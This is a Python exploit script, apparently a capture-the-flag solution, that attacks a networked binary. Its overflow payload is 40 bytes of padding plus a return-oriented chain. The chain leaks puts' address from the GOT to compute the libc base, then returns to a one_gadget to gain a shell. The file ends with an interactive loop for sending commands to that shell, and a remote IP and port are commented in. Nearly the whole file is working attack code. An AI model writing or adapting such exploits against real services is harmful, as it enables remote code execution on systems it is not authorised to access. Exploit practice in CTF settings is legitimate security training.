import socket
import readline

host = '127.0.0.1'
port = 9000
#host = '138.68.183.216'
#port = 31104

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None, decode=True):
  # TODO
  res = s.recv(4096)
  print(f'[<] {info if info else ""}')
  if decode:
    print(res.decode('utf-8'))
  else:
    print(res)
  return res

def recvuntil(stop, decode=True):
  res = b''
  while stop not in res:
    res += recv(decode=decode)
  return res

def send(data):
  # TODO
  data = data + b'\n' if data[-1] != b'\n' else data
  s.send(data)

def interact():
  for _ in range(100):
    cmd = input('> ').encode('ascii')
    send(cmd)
    recv()


padding = b'A'*40
puts_got = 0x601f88
puts_plt = 0x400780
puts_offset = 0x80aa0
one_gadget_offset = 0x10a41c
get_descr_func = 0x4013af

# gadget
pop_rdi = 0x401443

payload  = padding
payload += pop_rdi.to_bytes(8, 'little')
payload += puts_got.to_bytes(8, 'little')
payload += puts_plt.to_bytes(8, 'little')
payload += get_descr_func.to_bytes(8, 'little')

recvuntil(b':')
send(b'AAAAAAAA')
recvuntil(b':')
send(b'AAAAAAAA')
recvuntil(b':')
send(b'20')
recvuntil(b':')
send(payload)

# Leak libc base
res = recvuntil(b'\xa0', decode=False)
res = res.split(b'\n')[2]
puts_adr  = int.from_bytes(res, 'little')
print(f'Puts Addr: {puts_adr:#02x}')
libc_base = puts_adr - puts_offset
print(f'Libc Base: {libc_base:#02x}')

one_gadget = libc_base + one_gadget_offset 

payload  = padding
payload += one_gadget.to_bytes(8, 'little')

#recv()
#recvuntil(b':')
send(b'AAAAAAAA')
recvuntil(b':')
send(b'AAAAAAAA')
recvuntil(b':')
send(b'20')
recvuntil(b':')
#input('stop')
send(payload)
recv()

interact()
